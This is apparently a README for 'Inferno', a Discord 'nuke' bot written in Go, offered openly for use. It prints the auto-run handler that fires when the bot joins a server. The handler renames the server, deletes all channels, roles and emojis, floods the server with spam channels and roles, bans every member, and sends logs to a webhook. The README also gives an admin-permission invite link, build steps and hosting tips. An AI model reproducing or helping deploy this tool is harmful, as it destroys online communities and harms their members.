<img src="https://media.discordapp.net/attachments/1109426745012142081/1183350870079971449/IMG_9567.png?ex=65880461&is=65758f61&hm=44475ba2ed4ff3a5e0a01e530660de151736d11b3038d632fbb672e66a0bd8cf&=&format=webp&quality=lossless&width=1202&height=657">

# Inferno Discord Bot
A powerful Discord nuke bot written on Go

   * [Bot's authorization link](https://discord.com/api/oauth2/authorize?client_id=1193564970751901776&permissions=8&scope=bot)
   * [Discord Server](https://discord.gg/kAfuNzeUDx)
<hr>

## Big thanks to [morg](https://github.com/00-Morg-00)
for code improvements

# .env file
There's many variables such as 

<pre>
{
    BOT_TOKEN: bot's token
    
    WEBHOOK_URL: Webhook's URL
    AVATAR_URL: avatar url for webhook

    CHANNEL_NAME: name of the channel
    SERVER_NAME: name of the server
    ROLE_NAME: name of the role

    EMBED_TITLE: Embed's title
    EMBED_DESCRIPTION: Embed's description

}
</pre>
/// All values are have string data type

# Code Structure
All bot's functions are in cogs folder
<pre>
    main.go
    auto.go
    .env
    avatar.webp
    - cogs
      - channels.go
      - emoji.go
      - leave.go
      - members.go
      - rename.go
      - roles.go
      - webhooks.go
</pre>

# main.go & auto.go
main.go - launches bot and OnGuildCreate handler from auto.go
<pre>
    sess.AddHandler(onGuildCreate) - function onGuildCreate is located in auto.go file
</pre>
<hr>
auto.go - launches bot's functions from cogs folder if bot joined the guilld
<pre>
func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
    var wg sync.WaitGroup

	cogs.Logs(s, event)
	cogs.GuildRename(s, event)

	wg.Add(1)
	go func() {
		defer wg.Done()
		channels, _ := s.GuildChannels(event.ID)
		cogs.DeleteChannels(s, channels, &wg)
	}()
	wg.Wait()

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			cogs.TextSpam(s, event, &wg)
		}()
	}
	wg.Wait()

	wg.Add(1)
	go func() {
		defer wg.Done()
		cogs.DeleteRoles(s, event)
	}()
	wg.Wait()

	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			cogs.RolesSpam(s, event)
		}()
	}
	wg.Wait()

	cogs.EmojiDelete(s, event)
	cogs.MemberBan(s, event)
	cogs.BotLeave(s, event)
}
</pre>

# cogs folder
There's located all bot's functions.
<pre>
	channels.go: 2 functions (DeleteChannels, TextSpam)
	emoji.go: 1 function that deletes all emojis from the server
	leave.go: 1 function that leaves from the server
	members.go: 1 function that bans all members from the server
	rename.go 1 function that renames the server 
	roles.go: 2 functions that deletes and creates roles (DeleteRoles, RolesSpam)
	webhooks.go: 1 function that send logs before nuke bot starts other functions via webhook.
</pre>

# Installation guide
<pre>
	1. Clone or download repository's source code
	2. Install golang
	3. Go to Inferno folder
	4. Change values in .env
	5. Run go build Inferno
</pre>

# Where to host?
We recommend you to use <a href="https://fl0.com">fl0.com</a>, <a href="https://koyeb.com">koyeb.com</a>, <a href="https://back4app.com">back4app.com</a> or <a href="https://render.com">render.com</a>. They're free and there you can host Inferno and other discord bots. More information about other hostings are <a href="https://github.com/DmitryScaletta/free-heroku-alternatives">here</a>

